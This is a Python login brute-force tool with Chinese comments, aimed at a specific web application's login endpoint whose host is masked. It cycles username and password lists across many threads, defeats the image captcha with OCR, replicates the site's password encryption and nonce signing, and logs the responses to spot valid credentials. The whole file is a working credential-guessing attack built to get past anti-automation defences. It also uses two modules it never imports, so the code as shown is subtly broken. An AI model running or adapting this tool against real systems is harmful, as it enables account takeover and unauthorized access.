#!/bin/python

import random
import subprocess
import requests
import argparse
import threading
import datetime, time
import queue
import enum
import os
import json
import logging
import hashlib
import base64

requests.packages.urllib3.disable_warnings()
logging.basicConfig(level=logging.WARNING)

# 全局配置是否通过代理发起请求
PROXIES = { 
    "http": "127.0.0.1:8080", 
    "https": "127.0.0.1:8080", 
}
IS2PRXOY = True


class BruteMode(enum.Enum):
    PITCHFORK = enum.auto()
    CLUSTER_BOMB = enum.auto()

class TerminateMode(enum.Enum):
    FIND_ONE = enum.auto()
    FIND_ALL = enum.auto()

class LBruter(object):
    # def __init__(self, threads, bmode, tmode, outfile, *payloads):
    def __init__(self, threads, bmode, *payloads):
        self.threads    =   threads
        self.thread_arr =   []
        self.bmode      =   bmode
        self.tmode      =   TerminateMode.FIND_ALL # tmode
        # self.outfile    =   outfile
        
        # self.rawoutfile =   "out/" + datetime.datetime.now().strftime('%Y%m%d%H%M%S') + "_raw.log"
        self.msgoutfile    =   "out/" + datetime.datetime.now().strftime('%Y%m%d%H%M%S') + "_msg.log"
        self.dicts   =   payloads
        # self.processingset = set()
        self.dictiter = self.dictGenerator()
        self.dictGeneratorLocker = threading.Lock()

        self.totaltries = 0
        self.alreadytried = 0

        self.rawmessage_q = queue.Queue()       # guid, payloads和原始响应包。
        self.message_q = queue.Queue()          # payloads, statuscode, set-cookie, location, content-lenght, content-hash, custom_value, guid 
        
        if self.bmode == BruteMode.PITCHFORK:
            tmp = list(map(lambda x: len(x),self.dicts))
            self.totaltries = min(tmp)
            print("Total %d ( %s ) tries ( %d threads)" % (self.totaltries, tmp, self.threads ))
        elif self.bmode == BruteMode.CLUSTER_BOMB:
            from functools import reduce
            self.totaltries = reduce((lambda x,y: x*y), list(map(len,self.dicts)))
            print("Total %d ( %s ) tries ( %d threads)"% ( self.totaltries, " * ".join(list(map(str,(list(map(len,self.dicts)))))), self.threads))

    def Run(self):
        for i in range(self.threads):
            t = threading.Thread(target = self.login_bruter)
            t.daemon=True
            self.thread_arr.append(t)

        for i in range(self.threads):
            self.thread_arr[i].start()

        self.threadAliveCount = len(self.thread_arr)
        self.displayMessages()  

    def displayMessages(self):

        # ....
        filePath,fileName=os.path.split(self.msgoutfile)
        if (filePath!="") and (not os.path.exists(filePath)):
            os.makedirs(filePath)   # 若不存在这个目录则递归创建

        # print("output: \n\t%s\n\t%s" % (self.msgoutfile, self.rawoutfile))
        print("output: \t%s" % self.msgoutfile)

        # with open(self.output, mode='a+', buffering=1, encoding = 'utf8') as f:  
        # with open(self.msgoutfile, mode='a+', encoding = 'utf8') as msgf, open(self.rawoutfile, mode='a+', encoding = 'utf8') as rawf:
        with open(self.msgoutfile, mode='a+', encoding = 'utf8') as msgf:
            while True:
                cursor=['-','\\','|','/']
                print("\rThreads: %-3d | Processing: %d/%d(%0.3f)"%(self.threadAliveCount,self.alreadytried,self.totaltries,(self.alreadytried/self.totaltries),cursor[int(time.time()) % 4]*4),end="")
                time.sleep(0.5)

                i = self.message_q.qsize()
                line = ""
                for ii in range(i):
                    line = self.message_q.get()
                    print(" \b\b"*50,end="")
                    print(line)
                    msgf.write("%s\n"%line)
                    self.alreadytried += 1

                # i = self.rawmessage_q.qsize()
                # for ii in range(i):
                #     line = self.rawmessage_q.get()
                #     rawf.write("%s\n"%line)

                self.threadAliveCount = 0
                for t in self.thread_arr:
                    if t.is_alive():
                        self.threadAliveCount = self.threadAliveCount+1
                if self.threadAliveCount==0:

                    print("\n---- Done!!! ----")
                    break

    """
    使用生成器来迭代字典。 非线程安全！！！
    """
    def dictGenerator(self):
        plist    = list(map(lambda x: len(x),self.dicts))
        plen = len(plist)
        indexs  = [0]*plen
        while True:

            overflag = False
            for i in range(plen):
                if indexs[i] >= plist[i]:
                    overflag = True
            # print(overflag)
            if not overflag:
                pitems = []
                for i in range(plen):
                    pitems.append(self.dicts[i][indexs[i]])

                # time.sleep(random.random())
                self.alreadytried += 1
                yield pitems
                if self.bmode == BruteMode.PITCHFORK:
                    for i in range(plen):
                        indexs[i] += 1
                elif self.bmode == BruteMode.CLUSTER_BOMB:
                    indexs[0] += 1
                    for i in range(1,plen):
                        if indexs[i-1] >= plist[i-1]:
                            indexs[i-1] = 0
                            indexs[i] += 1

            else:
                # print(indexs,overflag)
                return


    def login_bruter(self):
        payloadlist = []

        # 会话初始化，利于复用。
        session=requests.session()
        if IS2PRXOY:
            session.proxies.update(PROXIES)     # 如此配置不一样有效，因为底层库会读取系统变量中的http_proxy等。
        session.verify=False
        session.headers={"User-Agent":"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)" }

        retryFlag = False
        retryDelay = 1

        while True:

            # time.sleep(2)    # 减速调试

            if retryFlag:
                retryDelay = retryDelay if retryDelay < 128 else 128
                time.sleep(0.5 * retryDelay)
                logging.debug("\tRetring...")
            else:
                try:
                    self.dictGeneratorLocker.acquire()
                    payloadlist = next(self.dictiter)
                    # logging.info("get new payloads: %s", payloadlist)
                    # self.dictGeneratorLocker.release()
                except StopIteration:
                    return
                finally:
                    self.dictGeneratorLocker.release()
            
            logging.info("\ttrying: %s", payloadlist)

            workid = datetime.datetime.now().strftime("%H%M%S_%f")
            outmsg = {"workid":workid,
                      "username_i": payloadlist[0],
                      "password_i": payloadlist[1]
                      }

            payloads = {"username":"",
                        "password":"",
                        "key":"",
                        "clientName":"/uVWZbu8Q6B/fPEyB2ARYwFtsXwejmZM"     # 硬编码项
                        }

            payloads["username"] = payloadlist[0]

            #### 处理cookie（清理上一轮请求的cookie，获取新的cookie）
            session.cookies.clear()

            #### 处理验证码，考虑使用ddddocr
            try:
                loginUUID = "%s"%uuid.uuid4()
                r = session.get("http://xx.xx.xx.xx:xx/bim-plus-demonstrate-server/captcha.jpg?uuid=%s"%loginUUID)

                ocr = ddddocr.DdddOcr(show_ad=False)
                payloads["captcha"] = ocr.classification(r.content)
                outmsg["captcha"] = payloads["captcha"]

                payloads["uuid"] = loginUUID
            
            except Exception as e:
                outmsg["result"] = "FAILED while identify captcha"
                self.message_q.put(outmsg)
                logging.warning("\t%s\t图片验证码识别失败\t%s"%(workid,e))

                retryFlag = True
                retryDelay *= 2
                continue

            #### 获取加密key
            _encode_key = ""
            try:
                getenckey = ""
                if IS2PRXOY:
                    getenckey = session.get("https://xx.xx.xx.xx:xx/rcp/open/api/key", timeout=10, proxies=PROXIES, verify=False)
                else:
                    getenckey = session.get("https://xx.xx.xx.xx:xx/rcp/open/api/key", timeout=10)
                _jsondata = getenckey.json()
                _encode_key = _jsondata.get("data").get("encode_key")
                _key = _jsondata.get("data").get("key")
                payloads["key"] = _key
            except Exception as e:
                outmsg["result"] = "FAILED while get enckey"
                self.message_q.put(outmsg)
                logging.warning("\t%s\t获key失败\t%s"%(workid,e))

                retryFlag = True
                retryDelay *= 2
                continue

            #### 字段加密
            try:
                tmp = subprocess.run(["node","js/yzt.js",payloadlist[1], _encode_key], stdout=subprocess.PIPE)
                assert(len(tmp.stdout) >= 4)
                payloads["password"] = tmp.stdout.decode()
                outmsg["password"] = tmp.stdout.decode()
            except Exception as e:
                outmsg["result"] = "FAILED while encryption"
                self.message_q.put(outmsg)
                logging.warning("\t%s\t加密错误\t%s"%(workid,e))

                retryFlag = True
                retryDelay *= 2
                continue

            #### 签名
            try:
                data = {"Accept":"application/json"}
                noncedata = session.post("http://xx.xx.xx.xx:xx/cp/hookNonce.json",json={},headers=data)

                payloads["stime"] = noncedata.json().get("data").get("stime")
                payloads["nonce"] = noncedata.json().get("data").get("nonce")

                outmsg["nonce"] = payloads["nonce"]
            except Exception as e:
                outmsg["result"] = "FAILED while get Nonce"
                self.message_q.put(outmsg)
                logging.warning("\t%s\t获取Nonce失败\t%s"%(workid,e))

                retryFlag = True
                retryDelay *= 2
                continue

            #### 提交登录请求
            try:
                logging.debug(payloads)
                # session.headers.update({"Content-Type":"application/json"})
                postlogin = session.post("https://xx.xx.xx.xx:xx/rcp/login?_allow_anonymous=true",json=payloads, timeout=10)
                outmsg["H_Status"] = str(postlogin.status_code)
                outmsg["H_Cookie"] = ";".join(list(map(lambda x:x.split(";")[0],postlogin.headers.get("Set-Cookie","").split(","))))
                outmsg["H_Location"] = postlogin.headers.get("Location","")
                outmsg["H_Content-Length"] = str(postlogin.headers.get("Content-Length","0"))
                if int(postlogin.headers.get("Content-Length","0")) > 0:
                    md = hashlib.md5()
                    md.update(postlogin.content)
                    outmsg["content-hash"] = base64.b64encode(md.digest())[:8].decode()
                outmsg["B_code"] = str(postlogin.json().get("code"))
                outmsg["B_message"] = str(postlogin.json().get("message"))

                self.message_q.put(outmsg)
                # logging.info("\t%s"%outmsg)

                retryFlag = False
                retryDelay = 1
            except Exception as e:
                outmsg["result"] = "FAILED while post logining"
                self.message_q.put(outmsg)
                logging.warning("%s\t登录错误\t%s"%(workid,e))
                
                retryFlag = True
                retryDelay *= 2



def build_list(listFile):
    with open(listFile, "r") as fd:
        return list(map(lambda x:x.strip(), fd.readlines()))

def main():
    # Creating a parser
    parser=argparse.ArgumentParser()

    groupUser = parser.add_mutually_exclusive_group(required=True)
    groupUser.add_argument('-u',dest="username",help="username split with , eg: root,admin")
    groupUser.add_argument('-U',dest='userList',help="username list file eg: ./username.txt")

    groupPwd = parser.add_mutually_exclusive_group(required=True)
    groupPwd.add_argument('-p',dest="password",help="passwords split with , eg: admin,root,123456")
    groupPwd.add_argument('-P',dest='pwdList',help="passwords list file, eg: ./password.txt")

    parser.add_argument('-m',dest='bruteMode',help="brute mode, C(luster bomb) or P(itchfork), default=C",default="C", choices=["C","P"])

    parser.add_argument("-t",dest="thread",type=int,help="mutli threads, default 3 threads",default=3)

    args=parser.parse_args()
    
    if args.username is not None:
        userList=list(args.username.split(","))
    else:
        userList = build_list(args.userList)
    if args.password is not None:
        pwdList=list(args.password.split(","))
    else:
        pwdList = build_list(args.pwdList)

    # outfilePath = None
    # if args.output is not None:
    #     outfilePath = args.output
    #     filePath,fileName=os.path.split(outfilePath)
    #     if (filePath!="") and (not os.path.exists(filePath)):
    #         os.mikedirs(filePath)   # 若不存在这个目录则递归创建


    # bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)
    # bruter_obj.run_bruteforce()

    bmode = BruteMode.CLUSTER_BOMB 
    if args.bruteMode == "P":
        bmode = BruteMode.PITCHFORK

    lbruter = LBruter(args.thread,bmode,userList,pwdList)
    lbruter.Run()

if __name__ == '__main__':
    main()